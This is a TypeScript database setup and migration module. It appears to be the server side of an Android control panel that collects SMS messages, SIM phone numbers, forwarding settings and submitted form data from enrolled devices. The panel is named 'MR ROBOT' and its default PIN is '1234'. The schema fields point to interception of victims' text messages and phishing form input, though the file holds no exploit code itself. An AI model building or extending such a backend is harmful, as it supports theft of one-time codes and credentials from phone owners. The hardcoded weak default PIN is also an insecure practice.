import { Pool, neonConfig } from "@neondatabase/serverless";
import { drizzle } from "drizzle-orm/neon-serverless";
import ws from "ws";
import { existsSync, readFileSync } from "fs";
import { resolve } from "path";
import { sql } from "drizzle-orm";
import { logger } from "./logger";
import * as schema from "./schema";

neonConfig.webSocketConstructor = ws;

const connectionString = process.env.NEON_DATABASE_URL;
if (!connectionString) {
  throw new Error("NEON_DATABASE_URL environment variable is required");
}

export const pool = new Pool({ connectionString });
export const db = drizzle(pool, { schema });

export const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
export const DEFAULT_APP_NAME = "MR ROBOT";
export const DEFAULT_APP_PIN = "1234";

const SCHEMA_SQL = `
CREATE TABLE IF NOT EXISTS apps (
  id SERIAL PRIMARY KEY,
  app_id TEXT NOT NULL,
  name TEXT NOT NULL,
  pin TEXT NOT NULL DEFAULT '1234',
  status TEXT NOT NULL DEFAULT 'active',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  delete_protection_pin TEXT,
  delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE
);
CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id);
ALTER TABLE apps ADD COLUMN IF NOT EXISTS pin TEXT NOT NULL DEFAULT '1234';
ALTER TABLE apps ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'active';
ALTER TABLE apps ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ NOT NULL DEFAULT NOW();
ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_pin TEXT;
ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE;
ALTER TABLE apps ADD COLUMN IF NOT EXISTS panel_token TEXT;

CREATE TABLE IF NOT EXISTS devices (
  id SERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  app_id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  name TEXT NOT NULL,
  android_version INTEGER NOT NULL DEFAULT 0,
  sim1_carrier TEXT,
  sim1_phone TEXT,
  sim2_carrier TEXT,
  sim2_phone TEXT,
  status TEXT NOT NULL DEFAULT 'offline',
  last_online TIMESTAMPTZ,
  forward_enabled BOOLEAN NOT NULL DEFAULT FALSE,
  forward_slot INTEGER,
  fcm_token TEXT,
  installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id);
CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id);
CREATE INDEX IF NOT EXISTS devices_user_idx ON devices(user_id);

CREATE TABLE IF NOT EXISTS messages (
  id SERIAL PRIMARY KEY,
  app_id TEXT NOT NULL,
  device_id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  from_sender TEXT NOT NULL,
  from_number TEXT NOT NULL,
  body TEXT NOT NULL,
  is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
  received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at);
CREATE INDEX IF NOT EXISTS messages_device_received_idx ON messages(device_id, received_at);
CREATE INDEX IF NOT EXISTS messages_user_idx ON messages(user_id);

CREATE TABLE IF NOT EXISTS form_data (
  id SERIAL PRIMARY KEY,
  app_id TEXT NOT NULL,
  device_id TEXT NOT NULL,
  data JSONB NOT NULL,
  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at);
CREATE INDEX IF NOT EXISTS form_data_device_idx ON form_data(device_id);

CREATE TABLE IF NOT EXISTS _meta (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL,
  set_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS settings (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL
);
`;

type JsonFile = {
  apps?: Array<{ appId: string; name: string; pin: string; status: string; createdAt: string }>;
  devices?: Array<Record<string, unknown>>;
  messages?: Array<Record<string, unknown>>;
  formData?: Array<{ appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string }>;
};

const JSON_MIGRATION_KEY = "json_migration_v1";

async function migrateFromJsonIfNeeded(): Promise<void> {
  // Idempotency gate: marker row in _meta. Insert-once with ON CONFLICT to also
  // block concurrent boots — only the winner sees rowCount > 0 and runs migration.
  const claim = await pool.query(
    `INSERT INTO _meta (key, value) VALUES ($1, 'in-progress')
     ON CONFLICT (key) DO NOTHING
     RETURNING key`,
    [JSON_MIGRATION_KEY],
  );
  if (claim.rowCount === 0) {
    logger.info("JSON migration already done or in progress on another boot — skipping");
    return;
  }

  const jsonPath = resolve(process.cwd(), "data", "local-db.json");
  if (!existsSync(jsonPath)) {
    logger.info("No legacy local-db.json found — marking migration done");
    await pool.query(`UPDATE _meta SET value='done', set_at=NOW() WHERE key=$1`, [JSON_MIGRATION_KEY]);
    return;
  }

  let parsed: JsonFile;
  try {
    parsed = JSON.parse(readFileSync(jsonPath, "utf8")) as JsonFile;
  } catch (err) {
    logger.warn({ err }, "Failed to parse legacy local-db.json — marking migration done to avoid retries");
    await pool.query(`UPDATE _meta SET value='done-parse-error', set_at=NOW() WHERE key=$1`, [JSON_MIGRATION_KEY]);
    return;
  }

  logger.info("Migrating legacy local-db.json data into Postgres…");

  // Run all inserts in a single transaction so partial failure leaves a clean state
  // (the _meta row stays as 'in-progress' on rollback, blocking other boots, but
  // a manual operator can reset it; alternatively the catch below resets it.)
  const client = await pool.connect();
  try {
    await client.query("BEGIN");

    for (const a of parsed.apps ?? []) {
      await client.query(
        `INSERT INTO apps (app_id, name, pin, status, created_at)
         VALUES ($1, $2, $3, $4, $5)
         ON CONFLICT (app_id) DO NOTHING`,
        [a.appId, a.name, a.pin, a.status, a.createdAt],
      );
    }

    for (const d of parsed.devices ?? []) {
      await client.query(
        `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token, installed_at, updated_at)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16)
         ON CONFLICT (device_id) DO NOTHING`,
        [
          d.deviceId, d.appId, d.userId, d.name, Number(d.androidVersion ?? 0),
          d.sim1Carrier ?? null, d.sim1Phone ?? null, d.sim2Carrier ?? null, d.sim2Phone ?? null,
          d.status ?? "offline", d.lastOnline ?? null,
          Boolean(d.forwardEnabled), d.forwardSlot ?? null, d.fcmToken ?? null,
          d.installedAt ?? new Date().toISOString(), d.updatedAt ?? new Date().toISOString(),
        ],
      );
    }

    for (const m of parsed.messages ?? []) {
      await client.query(
        `INSERT INTO messages (app_id, device_id, user_id, from_sender, from_number, body, is_sensitive, received_at)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
        [m.appId, m.deviceId, m.userId, m.fromSender, m.fromNumber, m.body, Boolean(m.isSensitive), m.receivedAt],
      );
    }

    for (const f of parsed.formData ?? []) {
      await client.query(
        `INSERT INTO form_data (app_id, device_id, data, submitted_at)
         VALUES ($1,$2,$3,$4)`,
        [f.appId, f.deviceId, JSON.stringify(f.data), f.submittedAt],
      );
    }

    await client.query(`UPDATE _meta SET value='done', set_at=NOW() WHERE key=$1`, [JSON_MIGRATION_KEY]);
    await client.query("COMMIT");
  } catch (err) {
    await client.query("ROLLBACK");
    // Release the claim so a future boot can retry
    await pool.query(`DELETE FROM _meta WHERE key=$1`, [JSON_MIGRATION_KEY]);
    logger.error({ err }, "JSON migration failed and rolled back — claim released for retry");
    throw err;
  } finally {
    client.release();
  }

  logger.info({
    apps: parsed.apps?.length ?? 0,
    devices: parsed.devices?.length ?? 0,
    messages: parsed.messages?.length ?? 0,
    formData: parsed.formData?.length ?? 0,
  }, "Legacy JSON migration completed");
}

let initPromise: Promise<void> | null = null;

export function initDb(): Promise<void> {
  if (!initPromise) {
    initPromise = (async () => {
      logger.info("Initializing Postgres schema…");

      // ── Self-heal: drop corrupted apps table ──────────────────────────────
      // Historical bug: ADD COLUMN ran without IF NOT EXISTS on every boot,
      // so apps table accumulated 1600+ columns in Neon. Detect and fix it.
      try {
        const { rows } = await pool.query<{ cnt: number }>(`
          SELECT COUNT(*)::int AS cnt
          FROM information_schema.columns
          WHERE table_schema = 'public' AND table_name = 'apps'
        `);
        const colCount = Number(rows[0]?.cnt ?? 0);
        logger.info({ colCount }, "apps table column count");
        if (colCount > 20) {
          logger.warn({ colCount }, "apps table corrupted — dropping to recreate (data will be re-seeded)");
          await pool.query("DROP TABLE IF EXISTS apps CASCADE");
        }
      } catch (healErr) {
        logger.warn({ healErr }, "self-heal check failed, continuing");
      }
      // ─────────────────────────────────────────────────────────────────────

      // Execute each SQL statement individually so a single failure doesn't abort the whole migration.
      // Split on semicolons, skip empty/whitespace-only chunks.
      const stmts = SCHEMA_SQL
        .split(";")
        .map(s => s.trim())
        .filter(s => s.length > 0);

      for (const stmt of stmts) {
        try {
          await pool.query(stmt);
        } catch (err) {
          const msg = err instanceof Error ? err.message : String(err);
          // "already exists" → idempotent, safe to ignore
          // "1600 columns" → column already present from old migration, safe to ignore
          if (
            msg.includes("already exists") ||
            msg.includes("1600") ||
            msg.includes("duplicate column")
          ) {
            logger.warn({ stmt: stmt.slice(0, 80), msg }, "Schema stmt skipped (already applied)");
          } else {
            throw err;
          }
        }
      }

      // Ensure pin column exists (some DBs have apps without pin, using app_secrets instead)
      try {
        await pool.query("ALTER TABLE apps ADD COLUMN IF NOT EXISTS pin TEXT NOT NULL DEFAULT '1234'");
      } catch { /* already present or unsupported — ok */ }

      // Ensure default app exists — try with pin, fall back without
      try {
        await pool.query(
          `INSERT INTO apps (app_id, name, pin, status) VALUES ($1,$2,$3,'active')
           ON CONFLICT (app_id) DO NOTHING`,
          [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN],
        );
      } catch {
        await pool.query(
          `INSERT INTO apps (app_id, name, status) VALUES ($1,$2,'active')
           ON CONFLICT (app_id) DO NOTHING`,
          [DEFAULT_APP_ID, DEFAULT_APP_NAME],
        );
      }

      await migrateFromJsonIfNeeded();
      logger.info("Postgres ready");
    })().catch((err) => {
      logger.error({ err }, "Postgres init failed");
      initPromise = null;
      throw err;
    });
  }
  return initPromise;
}
